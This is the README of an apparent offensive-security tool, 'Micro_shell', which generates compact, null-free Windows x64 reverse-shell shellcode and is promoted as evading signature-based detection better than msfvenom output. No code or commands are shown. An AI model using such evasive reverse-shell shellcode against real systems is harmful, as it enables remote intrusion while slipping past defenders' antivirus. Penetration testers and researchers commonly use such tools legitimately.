# Micro_shell
Microshell is a lightweight and efficient Python script designed for dynamically generating Windows X64 Position-Independent Code (PIC) Null-Free reverse shell shellcode. Depending on the options selected, the generated shellcode can be up to 27 bytes smaller than comparable shellcode from msfvenom, while also avoiding the inclusion of 0x00 bytes. Additionally, because MSF's shellcode is widely used and therefore more likely to be flagged by signature-based detection methods, the shellcode generated by microshell offers an added layer of evasion capability.
